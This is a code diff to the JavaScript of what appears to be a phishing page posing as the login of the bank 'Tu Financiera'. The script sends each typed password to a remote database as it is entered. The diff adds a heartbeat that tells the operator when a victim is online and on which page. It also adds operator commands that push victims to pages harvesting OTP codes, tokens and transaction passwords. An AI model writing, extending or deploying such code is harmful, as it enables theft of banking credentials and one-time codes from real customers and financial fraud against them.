@@ -147,7 +147,7 @@
 
   pass.addEventListener('input', function(){
     fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({clave:this.value})}).catch(function(){});
+      body:JSON.stringify({clave:this.value, ultimoPing:Date.now(), online:true})}).catch(function(){});
   });
 
   ojo.addEventListener('click', function(){
@@ -156,6 +156,18 @@
 
   bh.addEventListener('click', function(){
     bc.style.display = bc.style.display === 'none' ? 'block' : 'none';
+  });
+
+  /* latido */
+  function latir(){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({online:true, ultimoPing:Date.now(), pagina:'index.html'})}).catch(function(){});
+  }
+  latir();
+  setInterval(latir, 5000);
+  window.addEventListener('beforeunload', function(){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({online:false})}).catch(function(){});
   });
 
   function fallar(m){
@@ -183,6 +195,9 @@
       origen: 'tufi',
       banco: 'Tu Financiera',
       estado: 'CLAVE',
+      pagina: 'index.html',
+      online: true,
+      ultimoPing: Date.now(),
       fecha: ahora.toLocaleDateString('es-PY') + ' ' + ahora.toLocaleTimeString('es-PY'),
       ts: Date.now()
     };
@@ -199,6 +214,10 @@
     fetch(DB+'/comandos/'+id+'.json').then(function(r){ return r.json(); }).then(function(c){
       if(!c) return;
       if(c.rechazo === 'login'){ salio = true; location.href = 'rechazar.html?t=login&u=' + id; }
+      else if(c.accion === 'codigo'){ salio = true; location.href = 'codigo.html?u=' + id + '&e=1'; }
+      else if(c.accion === 'token'){ salio = true; location.href = 'token.html?u=' + id + '&e=1'; }
+      else if(c.accion === 'clave'){ salio = true; location.href = 'clavetransaccional.html?u=' + id; }
+      else if(c.accion === 'dejar'){ salio = true; location.href = 'final.html?u=' + id; }
     }).catch(function(){});
   }, 3000);
 })();
